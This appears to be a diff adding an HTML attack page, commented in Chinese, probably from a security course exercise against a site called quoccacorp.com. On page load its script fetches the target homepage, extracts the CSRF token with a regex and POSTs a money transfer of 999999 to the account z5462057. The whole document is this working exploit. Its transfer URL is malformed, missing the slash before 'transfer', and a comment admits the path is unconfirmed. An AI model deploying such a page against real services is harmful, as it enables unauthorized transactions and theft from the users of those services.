@@ -1,0 +1,24 @@
+<!-- 这是一个自动攻击页面 -->
+<script>
+    async function exploit() {
+        // 1. 访问主页获取机器人当前的 CSRF Token
+        const response = await fetch('https://quoccacorp.com');
+        const text = await response.text();
+        
+        // 2. 使用正则从 HTML 中提取 token (假设在 input 标签里)
+        const match = text.match(/name="csrf_token" value="([^"]+)"/);
+        const token = match ? match[1] : '';
+
+        // 3. 构造转账请求，把钱转给你的账户 z5462057
+        if (token) {
+            fetch('https://quoccacorp.comtransfer', { // 请确认转账接口路径是否为 /transfer
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded',
+                },
+                body: `csrf_token=${encodeURIComponent(token)}&username=z5462057&amount=999999`
+            });
+        }
+    }
+    exploit();
+</script>
